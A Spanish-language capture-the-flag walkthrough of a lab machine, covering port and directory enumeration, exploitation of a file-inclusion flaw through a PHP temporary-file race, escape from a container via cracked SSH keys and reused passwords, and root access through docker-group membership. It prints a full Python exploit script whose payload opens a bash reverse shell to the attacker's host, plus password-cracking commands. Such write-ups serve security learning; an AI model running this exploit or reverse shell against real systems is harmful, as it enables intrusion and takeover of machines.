## Enumeración

Vamos a comenzar analizando la red en busca de la máquina víctima. Para ello, nos ayudaremos de [[Arp-Scan]]:

```
arp-scan -I eth0 --localnet --ignoredups
```

![[Pasted image 20250830205829.png]]

Como podemos ver, la dirección IP de la máquina víctima es `192.168.1.70`. Con esto en mente, vamos a realizar una prueba con `ping` para comprobar si la máquina está activa e intentar identificar su sistema operativo:

```
ping -c 1 192.168.1.70
```

![[Pasted image 20250830205957.png]]

Como podemos observar, el TTL es de 64, por lo que podemos sospechar que se trata de una máquina Linux.

Ahora, vamos a realizar un escaneo de puertos con [[Nmap]] para identificar los servicios disponibles:

```
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.70 -oG allports
```

![[Pasted image 20250830210957.png]]

Como vemos, únicamente tenemos abierto el puerto `80`. Por lo tanto, vamos a realizar un escaneo más exhaustivo para obtener información sobre el servicio:

```
nmap -p80 -sCV 192.168.1.70 -oN target
```

![[Pasted image 20250830211128.png]]

Perfecto, tenemos una aplicación web ejecutándose en el puerto 80. Antes de comenzar a explorarla, vamos a utilizar [[WhatWeb]] para identificar las tecnologías que utiliza:

```
whatweb http://192.168.1.70
```

![[Pasted image 20250830211307.png]]

Como podemos observar, encontramos información sobre las versiónes de PHP y Apache, pero no obtenemos muchos más detalles. Por lo tanto, vamos a visitar la página para comprobar qué contenido encontramos:

![[Pasted image 20250830211449.png]]

Vemos, la página web, pero no encontramos nada especialmente interesante a simple vista. Vamos a continuar con la enumeración para identificar otros recursos que puedan estar disponibles.

Para ello, utilizaremos Gobuster y buscaremos directorios y archivos PHP:

```
gobuster dir -u http://192.168.1.70 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

![[Pasted image 20250830215053.png]]

Como resultado, encontramos el archivo `info.php`. Vamos a acceder a él para comprobar qué información nos proporciona:

![[Pasted image 20250830220622.png]]

Algo que podemos investigar a partir de este resultado es si existe alguna forma de incluir archivos en el sistema. Si encontramos un parámetro vulnerable a [[Local File Inclusion (LFI)]], podríamos intentar acceder a archivos locales y comprobar hasta dónde nos permite llegar esa vulnerabilidad.

![[Pasted image 20250830220744.png]]

Como podemos ver, la aplicación permite subir archivos. Por lo tanto, vamos a comprobar cómo procesa las peticiónes de subida y si podemos aprovechar esta funcionalidad.

Primero, vamos a interceptar una petición GET normal hacia `info.php` y enviarla a Repeater en Burp Suite:

![[Pasted image 20250830220902.png]]

Ahora, vamos a modificar la petición poco a poco para construir una solicitud que permita enviar un archivo.

Primero, cambiamos el método de `GET` a `POST`:

![[Pasted image 20250830220958.png]]

Después, vamos a construir la estructura necesaria para enviar el archivo. Para tener una referencia del formato, podemos buscar información sobre `Content-Type` y `boundary` en peticiónes `multipart/form-data`:

![[Pasted image 20250830221824.png]]

Una vez preparada la petición, la enviamos y revisamos la respuesta del servidor:

![[Pasted image 20250830221833.png]]

Como vemos, al filtrar la respuesta por `test`, encontramos información sobre el archivo y la ruta temporal donde se ha almacenado.

Esto es una buena señal, ya que hemos conseguido que el servidor procese nuestra petición y nos proporcione la ubicación temporal del archivo. Ahora necesitamos encontrar una forma de incluir ese archivo mediante una vulnerabilidad de tipo [[Local File Inclusion (LFI)]].

Como todavía no hemos encontrado otra vía de entrada, vamos a utilizar [[Wfuzz]] para buscar parámetros que puedan ser vulnerables en `index.php`:

```
wfuzz -c -t 200 --hl=136 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.70/index.php?FUZZ=/etc/passwd"
```

![[Pasted image 20250830222542.png]]

Como podemos observar, encontramos un parámetro llamado `filename`. Ahora vamos a comprobar si realmente permite acceder a archivos locales:

![[Pasted image 20250830222649.png]]

Como vemos, el parámetro funciona y conseguimos obtener el resultado esperado. Por lo tanto, tenemos indicios de que la aplicación es vulnerable a LFI.

Con esto en mente, vamos a intentar aprovechar la subida temporal de archivos junto con la inclusión local para comprobar si podemos conseguir ejecución remota de comandos. Esta técnica puede aprovechar una condición de carrera, por lo que vamos a investigar si es posible acceder al archivo temporal antes de que PHP lo elimine.

Primero, vamos a preparar un archivo PHP llamado `cmd.php` y comprobar que se sube correctamente:

![[Pasted image 20250830222922.png]]

Ahora, vamos a realizar la subida y revisar la respuesta:

![[Pasted image 20250830222948.png]]

Perfecto, ya tenemos el archivo subido y conocemos la ruta temporal que nos devuelve el servidor.

![[Pasted image 20250830223303.png]]

Sin embargo, cuando intentamos acceder al archivo, no obtenemos el resultado esperado. Una posible explicación es que PHP elimine el archivo temporal después de procesar la petición.

Esto nos lleva a plantear una posible **condición de carrera (**_**Race Condition**_**)**: si conseguimos incluir el archivo mientras todavía existe, podríamos ejecutar su contenido antes de que sea eliminado.

Para probar esta técnica, vamos a utilizar como referencia el script disponible en HackTricks, que demuestra cómo combinar `phpinfo()`, archivos temporales y LFI:

[HackTricks: LFI2RCE vía PHPInfo](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)

El script original requiere adaptaciones según la aplicación objetivo, por lo que vamos a revisar los parámetros, la petición de inclusión y el código que queremos ejecutar.

```
#!/usr/bin/python
import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%s\r
<?php system("bash -c 'bash -i>& /dev/tcp/192.168.1.110/443 0>&1'"); ?>\r""" % TAG

    REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD

    padding = "A" * 5000

    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)

    # Adaptar esta petición a la ruta vulnerable a LFI.
    LFIREQ = """GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""

    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""

    while len(d) < offset:
        d += s.recv(offset)

    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)

    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter = 0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter

        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)

                if self.event.is_set():
                    break

                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    """Obtiene el offset de tmp_name en la respuesta de phpinfo()."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)

    d = ""

    while True:
        i = s.recv(4096)
        d += i

        if i == "":
            break

        # Detectar el final de la respuesta.
        if i.endswith("0\r\n\r\n"):
            break

    s.close()

    i = d.find("[tmp_name] =&gt")

    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i+10], i)

    # Ajustar ligeramente el offset.
    return i + 256

def main():
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port = 80

    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %s: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz = 10

    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %s: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []

    for i in range(0, poolsz):
        tp.append(
            ThreadWorker(
                e, l, maxattempts,
                host, port, reqphp, offset, reqlfi, tag
            )
        )

    for t in tp:
        t.start()

    try:
        while not e.wait(1):
            if e.is_set():
                break

            with l:
                sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()

                if counter >= maxattempts:
                    break

        print

        if e.is_set():
            print "Woot!  \\m/"
        else:
            print ":("

    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shutting down..."

    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
```

En este script debemos adaptar los elementos necesarios a nuestro escenario, como la dirección IP, la ruta de la aplicación que proporciona la información de PHP, el parámetro vulnerable a LFI y el comando que queremos ejecutar.

Una vez revisadas estas modificaciones, vamos a ejecutar el script con Python 2.7, que es la versión de Python para la que está escrito:

```
python2.7 phpinfolfi.py 192.168.1.70 80
```

![[Pasted image 20250830224950.png]]

Como podemos observar, conseguimos recibir una conexión. Ahora vamos a realizar el tratamiento de la sesión y comenzar a enumerar el sistema para identificar dónde estamos ejecutando los comandos:

![[Pasted image 20250830225220.png]]

Como vemos, en la imagen, hemos conseguido entrar, pero hay algo importante: no estamos directamente en la máquina anfitriona, sino dentro de un contenedor. Por lo tanto, nuestro siguiente objetivo será investigar el entorno y buscar una forma de salir de él.

## Escape del contenedor

Después de realizar varias comprobaciones, no encontramos una vía clara para salir del contenedor. Por lo tanto, vamos a utilizar una herramienta de enumeración más completa: [[LinPEAS]].

En un primer intento podemos descargar y ejecutar la herramienta desde nuestra máquina atacante. Sin embargo, como la máquina víctima no tiene acceso a Internet, vamos a descargar el archivo localmente y levantar un servidor para transferirlo.

![[Pasted image 20250830230248.png]]

Al revisar los resultados de LinPEAS, encontramos varios archivos ocultos en el directorio raíz. Vamos a investigarlos para comprobar si contienen información útil:

![[Pasted image 20250830230414.png]]

En este caso, copiamos el archivo comprimido al directorio `/tmp` y cambiamos su nombre para poder identificarlo y trabajar con él más cómodamente.

Ahora, vamos a descomprimirlo y revisar su contenido:

![[Pasted image 20250830230535.png]]

Como podemos observar, encontramos una clave privada y una clave pública que parecen estar relacionadas con el usuario `root`.

![[Pasted image 20250830230626.png]]

La clave privada está cifrada, por lo que vamos a copiarla a nuestra máquina para intentar recuperar su contraseña.

![[Pasted image 20250830230752.png]]

Para ello, utilizaremos `ssh2john`, una herramienta que permite convertir una clave privada SSH cifrada en un formato que John the Ripper pueda procesar:

```
ssh2john id_rsa > hash
```

![[Pasted image 20250830230940.png]]

Ahora, que tenemos el hash, vamos a utilizar John the Ripper junto con la lista de contraseñas `rockyou.txt`:

```
john -w:/usr/share/wordlists/rockyou.txt hash
```

![[Pasted image 20250830231700.png]]

Como podemos observar, conseguimos recuperar la contraseña de la clave privada:

- `choclate93`


Ahora, debemos recordar que el puerto 22 no estaba expuesto desde el contenedor. Sin embargo, esto no significa que el servicio SSH tampoco esté disponible en la máquina anfitriona.

La dirección IP del contenedor es `192.168.150.21`, por lo que vamos a comprobar si la dirección `192.168.150.1` corresponde a un sistema accesible desde su red:

```
echo '' > /dev/tcp/192.168.150.1/22 && echo $?
```

![[Pasted image 20250830232015.png]]

Como vemos, el código de salida es `0`, lo que indica que la conexión TCP se ha establecido correctamente. Por lo tanto, vamos a intentar conectarnos por SSH utilizando la clave privada que encontramos:

```
ssh -i root root@192.168.150.1
```

![[Pasted image 20250830232219.png]]

Sin embargo, la clave privada no nos permite acceder directamente con el usuario `root`. Esto puede deberse a que la clave corresponde a otro usuario o a que el servidor SSH no acepta esa clave para esa cuenta.

También podemos probar si la contraseña que recuperamos es reutilizada por el usuario `root` dentro del contenedor:

![[Pasted image 20250830232418.png]]

Como vemos, conseguimos convertirnos en `root` dentro del contenedor. Esto nos permite continuar con la investigación de los archivos y las claves que encontramos.

El usuario `root` también tiene un par de claves SSH, aunque la clave privada está cifrada. Vamos a revisar primero la clave pública:

![[Pasted image 20250830232656.png]]

Como podemos observar, la clave pública contiene una referencia al usuario `admin`. Esto nos hace pensar que podría existir una relación entre esa clave y una cuenta del sistema anfitrión.

En algunos entornos, las claves SSH se configuran para permitir la autenticación sin contraseña de usuario, aunque la clave privada puede estar protegida por una frase de contraseña. Por lo tanto, vamos a probar si podemos utilizar esa clave para acceder a la máquina anfitriona.

![[Pasted image 20250830232918.png]]

Como vemos, se nos solicita la contraseña de la clave privada. Podemos probar la contraseña que recuperamos anteriormente, `choclate93`, para comprobar si se está reutilizando:

![[Pasted image 20250830233030.png]]

Perfecto, conseguimos salir del contenedor y acceder a la máquina anfitriona. Ahora nuestro objetivo será escalar privilegios hasta obtener acceso como `root` en el sistema real.

## Escalada de privilegios

Una vez dentro de la máquina anfitriona, vamos a comprobar los grupos a los que pertenece nuestro usuario para identificar posibles vías de escalada:

![[Pasted image 20250830233141.png]]

Como podemos observar, pertenecemos al grupo `docker`. Esto es especialmente interesante, ya que los usuarios que pueden controlar el servicio Docker suelen tener permisos suficientes para crear contenedores y configurar sus montajes.

Por lo tanto, podemos aprovechar esta configuración para montar el sistema de archivos raíz de la máquina anfitriona dentro de un contenedor que controlemos.

Vamos a crear un contenedor con un montaje que nos permita acceder al sistema de archivos de la máquina real:

![[Pasted image 20250830233403.png]]

Una vez creado, vamos a entrar en el contenedor:

![[Pasted image 20250830233506.png]]

Recordemos que montamos el sistema de archivos de la máquina anfitriona en `/mnt/root`. Vamos a revisar su contenido para comprobar si tenemos acceso a los directorios del sistema real:

![[Pasted image 20250830233543.png]]

Como podemos ver, tenemos acceso al sistema de archivos de la máquina anfitriona. Esto significa que, si tenemos permisos de escritura sobre los archivos montados, los cambios realizados desde el contenedor también se reflejarán fuera de él.

Con esto en mente, vamos a modificar los permisos de la shell de Bash para asignarle el bit SUID. Después saldremos del contenedor y comprobaremos si podemos aprovechar ese cambio para obtener privilegios de `root` en la máquina anfitriona:

![[Pasted image 20250830233855.png]]

Como vemos, los cambios se han aplicado. Por lo tanto, vamos a comprobar si podemos utilizar Bash para obtener una shell con privilegios elevados:

![[Pasted image 20250830233931.png]]

**¡Máquina terminada!**